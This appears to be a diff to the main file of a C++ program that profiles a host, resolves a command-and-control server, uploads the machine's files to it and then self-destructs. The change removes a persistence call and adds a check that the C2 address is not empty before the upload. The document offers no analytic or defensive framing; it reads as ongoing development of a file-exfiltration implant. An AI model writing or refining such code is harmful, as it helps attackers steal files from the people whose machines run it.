@@ -1,6 +1,5 @@
 #include "Core/upload.hpp"
 #include "Core/self_destruct.hpp"
-#include "Core/persistence.hpp"
 #include "Core/profiler.hpp"
 #include "Communication/google_resolve.hpp"
 #include "Communication/c2_resolve.hpp"
@@ -20,18 +19,17 @@ void CleanupAndDestroy() {
 
 
 int main() {
-    PersistOnMachine();
     Profiler();
 
-    
     // Mode 1: run once and then > cleanup > self destruct
     if (ONETIMERUN) {
         bool ReachIntranet = googleConn();
         if (ReachIntranet) {
             std::wstring C2 = C2Conn(URLS);
-
-            std::cout << "Running file upload" << std::endl;
-            ProcessFilesAndUpload(C2);
+            if (!C2.empty()) {
+                std::cout << "Running file upload" << std::endl;
+                ProcessFilesAndUpload(C2);
+            }
         }
         
         
